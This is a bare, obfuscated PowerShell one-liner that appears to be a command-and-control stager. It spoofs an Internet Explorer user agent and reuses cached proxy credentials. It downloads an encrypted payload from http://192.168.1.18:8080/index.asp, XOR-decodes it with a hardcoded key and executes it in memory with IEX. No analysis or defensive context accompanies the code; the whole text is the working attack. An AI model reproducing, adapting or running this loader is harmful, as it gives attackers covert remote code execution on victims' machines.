
$wc=NEW-OBject SySTem.NET.WEbCLieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEadErS.AdD('User-Agent',$u);$wC.PRoxY = [SysTem.Net.WeBREQuesT]::DEFAuLTWEbPROxY;$WC.PROxy.CREdeNtIALS = [SYsteM.NET.CREDentIaLCAcHE]::DeFauLTNEtwOrkCrEdenTIalS;$K='c433c996947013571747a53c806e586d';$i=0;[chAr[]]$b=([cHar[]]($WC.DOWnLOadStriNG("http://192.168.1.18:8080/index.asp")))|%{$_-BXor$k[$I++%$K.LengtH]};IEX ($B-JOIn'')

